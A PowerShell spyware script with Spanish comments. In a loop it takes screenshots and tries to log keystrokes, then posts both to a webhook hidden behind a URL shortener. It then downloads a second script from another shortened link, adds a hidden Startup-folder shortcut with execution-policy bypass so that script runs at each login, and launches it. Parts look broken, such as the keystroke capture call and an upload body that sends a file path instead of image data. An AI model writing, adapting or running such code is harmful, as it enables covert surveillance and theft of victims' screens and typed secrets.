# Instalar el módulo Windows Input Simulator si no está instalado
if (-not (Get-Module -Name WindowsInput)) {
    Install-Module -Name WindowsInput -Scope CurrentUser -Force
}

$hookurl = "https://bit.ly/chu_kbras"
$seconds = 30 # Intervalo entre capturas
$a = 0 # Contador de imágenes enviadas al webhook
$maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script

# Detección de URL acortada
if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; $hookurl = (irm $hookurl).url}

# Importar el módulo Windows Input Simulator
Import-Module WindowsInput

do {
    # Capturar la pantalla
    $Filett = "$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)

    # Capturar pulsaciones de teclado
    $Keyboard = [WindowsInput.WindowsInputExtensions]::Simulate
    $text = $Keyboard::Capture()
    
    # Enviar la imagen y el texto al webhook
    $boundary = [System.Guid]::NewGuid().ToString()
    $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="screenshot.png"
Content-Type: image/png

$Filett
--$boundary
Content-Disposition: form-data; name="text"

$text
--$boundary--
"@

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -Body $body

    # Eliminar la captura de pantalla
    Remove-Item -Path $Filett

    Start-Sleep $seconds

    # Incrementar contador de imágenes enviadas al webhook
    $a++

    # Verificar si se ha alcanzado la cantidad máxima de imágenes
    if ($a -eq $maxImages) {
        # Descargar el script principal
        $syswUrl = "https://bit.ly/Screen_dc"
        $syswPath = "$env:USERPROFILE\sysw.ps1"
        Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
        
        # Crear acceso directo en la carpeta de inicio del usuario
        $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($shortcutLocation)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`""
        $shortcut.Save()
        
        # Ejecutar el script principal de manera oculta
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`"" -WindowStyle Hidden
        
        # Reiniciar contador de imágenes
        $a = 0
    }
} while ($true)